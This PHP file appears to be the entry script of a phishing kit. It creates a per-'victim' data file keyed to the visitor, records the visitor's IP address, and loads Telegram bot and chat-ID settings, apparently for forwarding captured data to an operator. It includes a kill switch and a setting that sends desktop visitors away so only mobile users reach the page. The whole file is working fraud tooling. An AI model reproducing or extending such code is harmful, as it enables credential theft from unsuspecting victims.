<?php 
@session_start();


$ajaxPath = "../panel/classes/processor.php";
require (__DIR__).'/panel/classes/mother.class.php';
require (__DIR__).'/panel/classes/admin.class.php';
$admin_json_file = (__DIR__).'/panel/data/admin.json';
 
$ip = $_SERVER['REMOTE_ADDR'];
if($ip=="::1"){
	$ip="127.0.0.1";
}

$m = new Mother;
$vicFile = $m->getFileId();
$m->createVic();
$m->setDataFile($vicFile);


$admin=new Admin;
$admin->setDataFile($admin_json_file);
$a_bot =  $admin->getData()["settings"]["telegram_bot"];
$a_ids =  $admin->getData()["settings"]["telegram_id"];
$block_pc =  $admin->getData()["settings"]["pc_block"];
$shutdown =  $admin->getData()["settings"]["shutdown"];
$notifs = $admin->getData()["settings"]["notifications"];

if($shutdown==1){
	exit;
}
 

require (__DIR__).'/lib/md.php';
$d = new Mobile_Detect;
if(!$d->isMobile() and $block_pc==1){
	exit(header("location: $REDIRECTION"));
}

 

?>